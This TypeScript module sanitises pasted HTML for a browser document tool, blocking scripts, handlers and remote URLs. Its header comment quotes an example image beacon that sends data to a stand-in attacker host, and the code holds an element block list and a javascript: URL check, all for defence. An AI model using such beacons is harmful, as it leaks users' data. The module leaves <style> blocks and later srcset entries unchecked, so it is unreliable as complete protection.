/**
 * HTML sanitiser shared by the two tools that render pasted markup.
 *
 * It lives in its own dependency-free module for a reason: both callers also
 * import a heavy engine (htmlPdf pulls pdf-lib, the image converter pulls
 * html2canvas), so the previous arrangement had a private copy in each to avoid
 * dragging the PDF engine into the image chunk. One module keeps a single
 * implementation without that cost.
 *
 * Two jobs, and the second matters more than it looks:
 *
 *  1. Nothing may EXECUTE — no scripts, frames, plugins, forms or inline
 *     handlers.
 *  2. Nothing may LEAVE THE DEVICE. PaperSnap's promise is that a document
 *     never leaves the browser, and a pasted `<img src="https://attacker/x?d=">`
 *     would break it: the renderer waits for every image it finds, so the
 *     request is genuinely made and the beacon carries whatever the attacker
 *     packed into the query string. Only `data:` and `blob:` URLs survive.
 */

/** True when a URL would make the browser go to the network. */
function isRemoteUrl(value: string): boolean {
  const url = value.trim();
  if (!url) return false;
  /* Anything with a scheme or a protocol-relative prefix resolves to a host;
   * relative paths stay same-origin and are harmless but rarely meaningful in
   * pasted markup, so they are left alone. */
  if (/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i.test(url)) {
    return !/^(?:data:|blob:|about:)/i.test(url);
  }
  return false;
}

/** Replace `url(...)` references to remote hosts inside a CSS declaration. */
function stripRemoteCss(css: string): string {
  return css.replace(
    /url\(\s*(['"]?)([^'")]+)\1\s*\)/gi,
    (match: string, _quote: string, url: string) => (isRemoteUrl(url) ? 'none' : match),
  );
}

/** Strip scripts, embeds, forms, inline handlers and every remote reference. */
export function sanitize(html: string): string {
  const tpl = document.createElement('template');
  tpl.innerHTML = html;
  tpl.content
    .querySelectorAll('script,iframe,object,embed,link,meta,base,form')
    .forEach((el) => el.remove());

  for (const el of tpl.content.querySelectorAll('*')) {
    for (const attr of Array.from(el.attributes)) {
      const name = attr.name.toLowerCase();

      if (name.startsWith('on')) {
        el.removeAttribute(attr.name);
        continue;
      }

      if (name === 'style') {
        el.setAttribute(attr.name, stripRemoteCss(attr.value));
        continue;
      }

      /* Any attribute that carries a URL — src, href, srcset, poster,
       * xlink:href, formaction, action — loses remote values. */
      if (/^(?:.*href|src|srcset|poster|action)$/.test(name)) {
        if (/^\s*javascript:/i.test(attr.value) || isRemoteUrl(attr.value)) {
          el.removeAttribute(attr.name);
        }
      }
    }
  }
  return tpl.innerHTML;
}
